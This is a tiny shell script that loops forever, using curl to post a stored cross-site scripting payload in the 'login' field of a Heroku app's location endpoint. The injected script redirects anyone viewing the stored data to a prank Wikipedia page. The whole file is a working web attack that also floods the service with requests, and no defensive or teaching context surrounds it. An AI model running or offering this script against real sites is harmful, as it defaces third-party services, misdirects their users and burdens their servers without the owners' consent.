while true

do

	curl --data "login=<script> window.location='https://en.wikipedia.org/wiki/Sandy_Balls';</script>&lat=0&lng=0" https://pure-river-81762.herokuapp.com/sendLocation
done
